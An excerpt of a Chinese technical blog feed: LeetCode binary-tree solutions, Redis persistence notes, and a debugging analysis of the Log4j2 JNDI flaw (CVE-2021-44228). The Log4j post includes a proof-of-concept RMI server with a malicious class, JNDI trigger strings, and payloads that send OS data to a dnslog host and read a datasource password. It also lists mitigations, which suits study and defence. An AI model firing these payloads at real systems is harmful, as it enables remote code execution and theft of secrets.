    <content type="html"><![CDATA[<p>祖先节点QAQ</p><span id="more"></span><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>首先，题目是要找二叉树的最近公共祖先，给出的定义是：“对于有根树 T 的两个节点 p、q，最近公共祖先表示为一个节点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（<strong>一个节点也可以是它自己的祖先</strong>）。”</p><img src="/2024/06/14/leetcode236%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%A5%96%E5%85%88%E8%8A%82%E7%82%B9/Snipaste_2024-06-14_21-33-06.png" class=""><h3 id="祖先节点"><a href="#祖先节点" class="headerlink" title="祖先节点"></a>祖先节点</h3><p>一个节点的祖先我简单理解为，这个节点向上回溯过程中遇到的所有节点，直到根节点为止。</p><p>两个节点的公共祖先节点我简单理解为，这两个节点回溯路径中重合的节点，直到根节点为止。</p><p>最近的公共祖先节点我简单理解为，重合节点中高度最小（深度最大）的节点。在判断中，可以认为一个公共祖先节点的左右子节点均不再是公共祖先节点，那么这个节点就是最近的公共祖先节点。</p><p>解题：</p><p>对于二叉树类的题目，一般就采用递归遍历的方式，这道题选择DFS，当我们遇到需要寻找的节点时，就返回这个节点，然后向下遍历左子树和右子树，得到遍历结果left和right。</p><p>此时left无非三种结果：null,p,q；同理right也是。</p><ul><li>当两者皆为空时，说明不存在，返回空即可</li><li>当left为空时，说明p或q某一个在当前root节点右侧，且可以保证当p和q在同一侧时，返回的总是p、q中深度小的那个，反之right为空同理</li><li>当两者均不为空时，因为是回溯的，所以第一次运行到最后的<code>return root</code>，说明当前的root节点是最近公共祖先节点</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">lowestCommonAncestor</span><span class="hljs-params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>{<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span> || root == p || root == q)<br>        {<br>            <span class="hljs-keyword">return</span> root;<br>        }<br>        TreeNode *left = <span class="hljs-built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);<br>        TreeNode *right = <span class="hljs-built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);<br>        <span class="hljs-keyword">if</span> (left == <span class="hljs-literal">NULL</span> &amp;&amp; right == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">if</span> (left == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> right;<br>        <span class="hljs-keyword">if</span> (right == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> left;<br>        <span class="hljs-keyword">return</span> root;<br>    }<br>};<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-44228分析</title>
    <link href="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/"/>
    <url>/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>很久之前分析过了，今天形成博客，顺带写了一个工具Demo</p><span id="more"></span><h2 id="Log4j2漏洞原理分析"><a href="#Log4j2漏洞原理分析" class="headerlink" title="Log4j2漏洞原理分析"></a>Log4j2漏洞原理分析</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><a href="https://www.cnblogs.com/fdxsec/p/17793755.html">参考文章</a></p><p>Apache Log4j2是一个基于Java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。 2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。</p><p>漏洞适应版本：2.0 &lt;= Apache log4j2 &lt;=2.14.1。jdk8u65。CVE-2021-44228</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h4><p>​log4j2是apache下的java应用常见的开源日志库，就是一个日志记录工具，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息</p><h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><p>​JNDI，全称为<strong>Java命名和目录接口</strong>（Java Naming and Directory Interface）,是SUN公司提供的一种标准的Java命名系统接口，<strong>允许从指定的远程服务器获取并加载对象</strong>。<strong>JNDI相当于一个用于映射的字典，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</strong></p><p>​其实就是可以让Java应用程序可以向远程服务器获取资源的接口，这也是这次利用的关键点，利用时常用的有RMI和LDAP两种服务。</p><h3 id="Java低版本原理"><a href="#Java低版本原理" class="headerlink" title="Java低版本原理"></a>Java低版本原理</h3><h4 id="原理描述"><a href="#原理描述" class="headerlink" title="原理描述"></a>原理描述</h4><p><a href="https://blog.csdn.net/hilaryfrank/article/details/121944757">参考文章</a></p><p>​Log4j2漏洞总的来说就是：因为Log4j2<strong>默认支持解析ldap/rmi协议</strong>（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。</p><p>​这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><p>首先我们编写一个测试代码调试一下漏洞是如何形成的：</p><p>RMIServer类：用于开启RMI服务，托管我们的恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String [] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException {<br>        <span class="hljs-comment">//启动rmi服务 端口为1099</span><br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry();<br>        <span class="hljs-comment">//创建资源为本机目录的HackingObj类，其中null代表本机目录，也可以指定服务器，如127.0.0.1:80绑定为本机nginx下资源</span><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">"rmi.HackingObj"</span>, <span class="hljs-string">"rmi.HackingObj"</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        <span class="hljs-comment">//绑定资源</span><br>        registry.bind(<span class="hljs-string">"3xsh0re"</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">"RMI服务初始化成功!"</span>);<br>    }<br>}<br></code></pre></td></tr></table></figure><p>HackingObj类：恶意代码类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HackingObj</span> {<br>    <span class="hljs-keyword">static</span> {<br>        System.out.println(<span class="hljs-string">"Hacking!"</span>);<br>        <span class="hljs-keyword">try</span> {<br>            Runtime.getRuntime().exec(<span class="hljs-string">"calc"</span>);<br>        }<span class="hljs-keyword">catch</span> (IOException e) {<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        }<br>    }<br>}<br></code></pre></td></tr></table></figure><p>上面的都是攻击者构造的。</p><p>测试类：用于测试Log4j2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">"${jndi:rmi://127.0.0.1/3xsh0re}"</span>;<br>        logger.error(<span class="hljs-string">"run {}"</span>,payload);<br>    }<br>}<br></code></pre></td></tr></table></figure><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>下面打断点调试漏洞路径：先打一个初始断点</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707233903961.png" class="" title="image-20240707233903961"><p>首先步进调试到下面的位置，发现在ReusableParameterizedMessage中调用了set函数，其实就是在初始化日志的格式</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708103123177.png" class="" title="image-20240708103123177"><p>可以发现这里初始化中的paramArray参数就是我们的payload</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708103609288.png" class="" title="image-20240708103609288"><p>以上完成了初始化。</p><p>ReusableLogEventFactory中createEvent函数（34行）进行了日志事件的初始化，也就是后面的event变量。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708105306091.png" class="" title="image-20240708105306091"><p>后面进入了LoggerConfig中的callAppender函数，然后这里的函数调用我就不贴图了：调用到AppenderControl中的tryCallAppender，然后调用AbstractOutputStreamAppender中的Append-&gt;tryAppend-&gt;directEncodeEvent。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708105456534.png" class="" title="image-20240708105456534"><p>在这之后调用了PatternLayout中的encode函数，可以发现调用了toText函数，继续跟进</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708110302291.png" class="" title="image-20240708110302291"><p>进入PatternLayout的toText函数，然后调用了序列化函数</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707223506436.png" class="" title="image-20240707223506436"><p>在toSerializable函数中，调用format函数，并将当前event和待处理字符串传入</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708110821531.png" class="" title="image-20240708110821531"><p>调试到PatternFormatter中的format函数发现此时在格式化需要打印的日志，可以发现在进行格式化的时候有两个参数，一个buf作为输出的缓冲。<strong>值得注意的是，这里调用了不同的converter的format函数。</strong></p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707235601603.png" class="" title="image-20240707235601603"><p>比如处理日期：调用的是DatePatternConverter的format函数</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708111850828.png" class="" title="image-20240708111850828"><p>处理字符串，当前的format函数进而调用了LiteralPatternConverter中的format函数</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708111114357.png" class="" title="image-20240708111114357"><p>继续调试，输入<code>${jndi:rmi://127.0.0.1/3xsh0re}</code>对应的是<code>%msg</code>，处理的converter是<code>MessagePatternConverter</code>，跟进它的format()。发现在MessagePatternConverter（第102行）中调用了另一个格式化方法，专门解析字符串<code>${}</code>，这里如果msg中存在<code>${</code>字符串，取出msg值后，就将整个msg字符串从<code>workingBuilder</code>中替换掉。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707223343811.png" class=""><p>先触发了replace函数，这里如果source也就是我们的payload不为空的话，将会调用substitute函数。那么substitute函数是干什么的呢。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708134537990.png" class="" title="image-20240708134537990"><p>我们继续看StrSubstitutor中的substitute函数，这里调用了另一个返回值为int的重构函数，稍微看一段这段代码，可以发现这个函数实际上是在递归的解析<code>${}</code>，直到将被包括的内容取出来。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708135153387.png" class="" title="image-20240708135153387"><p>同样的，在这个substitute函数中，递归解析完成了，会调用resolveVariable (第418行)去触发了JndiLookup函数，加载字符串中的内容</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707230109954.png" class=""><p>这里调用了StrLookup的lookup函数</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707231739578.png" class=""><p>这是一个接口类，根据不同的事件去匹配不同的实现，这里实现了JndiLookup接口。其实这里可以发现支持了很多的Lookup函数，说明可以解析的参数还有很多。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取java运行时版本，jvm版本，和操作系统版本</span><br><span class="hljs-string">"${java:runtime} ${java:vm} ${java:os}"</span><br><span class="hljs-string">"${sys:java.version}"</span><br><br><span class="hljs-comment">//外带数据:</span><br><span class="hljs-string">"${jndi:ldap://${java:os}.dkfjlsd.dnslog.cn}"</span><br><br><span class="hljs-comment">//还可利用Bundle协议读取项目配置文件来获取敏感信息。</span><br><span class="hljs-string">"${bundle:application:spring.datasource.password}"</span><br></code></pre></td></tr></table></figure><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707231833038.png" class=""><p>这里调用JndiLookup中的convertJndiName去处理我们的路径，得到要加载类的地址</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707230247931.png" class=""><p>然后调用了JndiManager</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707232102120.png" class=""><p>使用JndiManager的lookup函数，然后这个lookup函数最终调用了java原生的lookup函数，导致反序列化远程加载恶意类。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240707230813761.png" class=""><p>到此，低版本Java的分析完了。</p><img src="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/image-20240708112758092.png" class="" title="image-20240708112758092"><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ol><li>升级到最新版</li><li>临时修改方法:<ul><li>jvm 添加 -Dlog4j2.formatMsgNoLookups=true 参数（版本&gt;=2.10.0有效）</li><li>设置系统环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS=true （版本&gt;=2.10.0有效）</li><li>log4j2 &lt; 2.10以下的版本移除JndiLookup类。</li></ul></li><li>禁止没有必要的业务访问外网</li></ol><p><a href="https://github.com/3xsh0re/Log4j2Exploiter">附上我的利用工具Demo</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>leetcode114认识二叉树的前驱节点</title>
    <link href="/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/"/>
    <url>/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>前驱节点？</p><span id="more"></span><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你二叉树的根结点 <code>root</code> ，请你将它展开为一个单链表：</p><ul><li>展开后的单链表应该同样使用 <code>TreeNode</code> ，其中 <code>right</code> 子指针指向链表中下一个结点，而左子指针始终为 <code>null</code> 。</li><li>展开后的单链表应该与二叉树 <a href="https://baike.baidu.com/item/%E5%85%88%E5%BA%8F%E9%81%8D%E5%8E%86/6442839?fr=aladdin"><strong>先序遍历</strong></a> 顺序相同。</li></ul><p>这道题一开始做的时候开了一个数组存了前序遍历的结果，然后对数组操作解题。做是做出来了，但感觉中等题应该有比较巧妙的思路解题。于是去看了题解，学习到了前驱节点这个概念。</p><h3 id="前驱与后继"><a href="#前驱与后继" class="headerlink" title="前驱与后继"></a>前驱与后继</h3><p><strong>一个节点的前驱节点，也就是中序遍历中该节点的前一个节点。</strong>举个例子：</p><img src="/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/Snipaste_2024-06-06_16-42-24.png" class=""><p>中序遍历的顺序为：1，2，4，5，7，8，9，11</p><p>那么7的前驱节点为5，8的前驱节点为7</p><p>分析一下就可以看出，5其实是7的左子树的最右下的节点，也是中序遍历左子的最后一个节点</p><p><strong>一个节点的后继节点，也就是中序遍历中该节点的后一个节点</strong></p><p>那么7的后继节点为8，8的后继节点为9</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>学习到了前驱节点，再看这道题，可以发现，要按照前序遍历的结果形成链表，就是要把<strong>访问到的当前节点的右子树接到当前节点的前驱节点上</strong>。</p><img src="/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/Snipaste_2024-06-06_16-53-05.png" class=""><p>那我做题的思路可以转变到：遍历节点，判断该节点的左子节点<code>lnode</code>是否存在，如果存在，取出这个左子树的最右下的节点，这个节点就是当前节点的前驱节点<code>pnode</code>，然后将当前遍历节点的右子节点<code>rnode</code>接到<code>pnode</code>上。做完上面的操作后，将该节点的右子树指针赋值为左子树指针，并将左子树指针置空。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">flatten</span><span class="hljs-params">(TreeNode* root)</span> </span>{<br>        TreeNode *current = root;<br>        <span class="hljs-keyword">while</span>(current!=<span class="hljs-literal">nullptr</span>)<br>        {<br>            <span class="hljs-comment">// 判断左子树是否为空</span><br>            <span class="hljs-keyword">if</span> (current-&gt;left!=<span class="hljs-literal">nullptr</span>)<br>            {<br>                TreeNode *lnode = current-&gt;left;<br>                <span class="hljs-comment">// 前驱节点</span><br>                TreeNode *pnode = lnode;<br>                <span class="hljs-keyword">while</span>(pnode-&gt;right!=<span class="hljs-literal">nullptr</span>) pnode = pnode-&gt;right;<br>                pnode-&gt;right = current-&gt;right;<br>                current-&gt;right = lnode;<br>                current-&gt;left  = <span class="hljs-literal">nullptr</span>;<br>            }<br>            current = current-&gt;right;<br>        }<br>    }<br>};<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis学习</title>
    <link href="/2024/06/05/Redis%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/06/05/Redis%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>之前写的项目里用过redis，但是没有专门学习过，现在系统学习一下。</p><span id="more"></span><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>redis是典型的非关系型数据库。以key-value形式存储。</p><p>NoSQL也有说法“Not Only SQL”。</p><p>优点：<strong>对数据高并发读写（内存操作）</strong>、<strong>单线程操作（原子性）</strong></p><p><strong>Redis为什么不用多线程？</strong></p><p>Redis并没有采用多线程的方式来提高性能，而是采用了<strong>单线程+异步IO</strong>模型</p><ol><li>单线程模型避免了多线程的上下文切换开销</li><li>多线程需要增加锁机制，增加系统的复杂性和开销，和redis的设计理念不符</li><li>Redis使用事件驱动模型，在单个线程中通过IO多路复用技术同时监听多个IO事件，并在事件发生时进行处理</li></ol><p><strong>场景设计：热点事件，某个网页点击量短时间内飙升</strong></p><p>将数据缓存在redis中，前端访问时，直接从内存中查数据；等到请求量下降时，再将点击量等等数据同步到关系型数据库中。保持数据的最终一致性即可。</p><h2 id="Redis事务"><a href="#Redis事务" class="headerlink" title="Redis事务"></a>Redis事务</h2><p>事务相当于执行批量的redis操作命令，事务的操作不是原子性的，当中间的操作出错时，不会停止执行命令，也不会回滚到出错前的状态。</p><h2 id="Redis持久化机制"><a href="#Redis持久化机制" class="headerlink" title="Redis持久化机制"></a>Redis持久化机制</h2><p>Redis不定时的将数据持久到硬盘中，Redis启动时，会提前将硬盘中的数据加载到内存。</p><h3 id="RDB方式"><a href="#RDB方式" class="headerlink" title="RDB方式"></a>RDB方式</h3><p>快照方式，将内存数据以快照方式写入到二进制文件中(dump.rdb)。触发RDB持久化过程分为手动触发和自动触发。</p><p>触发机制：</p><h4 id="手动触发："><a href="#手动触发：" class="headerlink" title="手动触发："></a>手动触发：</h4><ol><li>save命令：<strong>会阻塞当前Redis服务器，无法接收其他请求</strong>，如果内存中数据较多，会造成长时间的阻塞，不建议在生产环境中使用</li><li>bgsave命令：<strong>异步操作，不会阻塞主进程</strong>。redis执行fork指令开启一个子进程，由子进程实现RDB持久化。</li></ol><p><strong>bgsave命令就一定不会阻塞主进程吗？</strong></p><p>不一定，bgsave命令中，fork子进程这个操作是同步的，如果fork一个子进程花费时间太久（一般很快），basave命令仍然有阻塞其他客户的请求的可能。</p><h4 id="自动触发："><a href="#自动触发：" class="headerlink" title="自动触发："></a>自动触发：</h4><p>使用save相关配置：save m n，表示m秒内数据集存在n次修改时会自动触发bgsave命令。</p><ul><li>优点：压缩紧凑的二进制文件，使用于备份、全量复制等场景。开发中可以按照每6小时执行一次bgsave备份。</li><li>缺点：RDB无法做到实时持久化，每次bgsave时都需要fork子进程，消耗时间</li></ul><h3 id="AOF方式"><a href="#AOF方式" class="headerlink" title="AOF方式"></a>AOF方式</h3><p><code>AOF(Append-only file)</code></p><p>与RDB存储某个时刻的快照不同，AOF持久化方式会记录客户端对服务器的每一次写操作命令，并将这些写操作以Redis协议追加保存到以后缀为aof文件末尾，在Redis服务器重启时，会加载并运行aof文件的命令，以达到恢复数据的目的。</p><p>Redis默认不开启AOF持久化方式，我们可以在配置文件中开启并进行更加详细的配置，如下面的redis.conf文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 开启aof机制</span><br>appendonly <span class="hljs-built_in">yes</span><br><br><span class="hljs-comment"># aof文件名</span><br>appendfilename <span class="hljs-string">"appendonly.aof"</span><br><br><span class="hljs-comment"># 写入策略,always表示每个写操作都保存到aof文件中,也可以是everysec或no</span><br>appendfsync always<br><br><span class="hljs-comment"># 默认不重写aof文件</span><br>no-appendfsync-on-rewrite no<br><br><span class="hljs-comment"># 保存目录</span><br><span class="hljs-built_in">dir</span> ~/redis/<br></code></pre></td></tr></table></figure><h4 id="三种写入策略"><a href="#三种写入策略" class="headerlink" title="三种写入策略"></a>三种写入策略</h4><ol><li>always：保存每一个写操作，很安全也很慢，因为写文件需要进行IO操作</li><li>everysec：默认写入策略，每秒写入一次AOF文件，所以最多刚要写入就宕机，最多丢失1s数据</li><li>no：交给OS来处理，最快，最不安全。</li></ol><h4 id="AOF文件重写"><a href="#AOF文件重写" class="headerlink" title="AOF文件重写"></a>AOF文件重写</h4><p>AOF将客户端的每一个写操作都追加到aof文件末尾，比如对一个key多次执行incr命令，这时候，aof保存每一次命令到aof文件中，aof文件会变得非常大。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">incr num 1<br>incr num 2<br>incr num 3<br>incr num 4<br>incr num 5<br>incr num 6<br>...<br>incr num 100000<br></code></pre></td></tr></table></figure><p>aof文件太大，加载aof文件恢复数据时，就会非常慢，为了解决这个问题，Redis支持aof文件重写，通过重写aof，可以生成一个恢复当前数据的最少命令集，比如上面的例子中那么多条命令，可以重写为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> num <span class="hljs-number">100000</span><br></code></pre></td></tr></table></figure><p>aof文件是一个二进制文件，并不是像上面的例子一样，直接保存每个命令，而使用Redis自己的格式，上面只是方便演示。</p><p><strong>AOF重写方式也是异步操作，即如果要写入aof文件，则Redis主进程会forks一个子进程来处理</strong></p><h4 id="重写AOF文件的好处"><a href="#重写AOF文件的好处" class="headerlink" title="重写AOF文件的好处"></a>重写AOF文件的好处</h4><ul><li>压缩aof文件，减少磁盘占用量。</li><li>将aof的命令压缩为最小命令集，加快了数据恢复的速度。</li></ul><h3 id="混合持久化"><a href="#混合持久化" class="headerlink" title="混合持久化"></a>混合持久化</h3><p>混合持久化是Redis 4.0之后新增的方式，结合了RDB和AOF的优点。</p><ul><li>在写入的时候，先把当前数据以RDB形式写入文件的开头，再将后续的操作命令以AOF的格式存入文件。这样既能保证Redis重启时的速度，又能降低数据丢失的风险。</li><li>混合持久化的缺点是，在Redis重启时需要同时处理两个文件（RDB文件和AOF文件），可能会比单一持久化机制的恢复速度慢。</li></ul><p>混合模式兼并了RDB重启后的快速恢复能力和AOF丢失数据风险低的能力，具体操作流程如下：</p><ol><li>子进程会通过<code>BGSAVE </code>写入AOF中</li><li>触发<code>BGREWRITEAOF</code>后，会将AOF写入到文件</li><li>将含有RDB和AOF的数据覆盖旧的AOF文件（这时AOF文件一半为RDB，一半为AOF）</li></ol><h4 id="AOF重写和RDB持久化的冲突"><a href="#AOF重写和RDB持久化的冲突" class="headerlink" 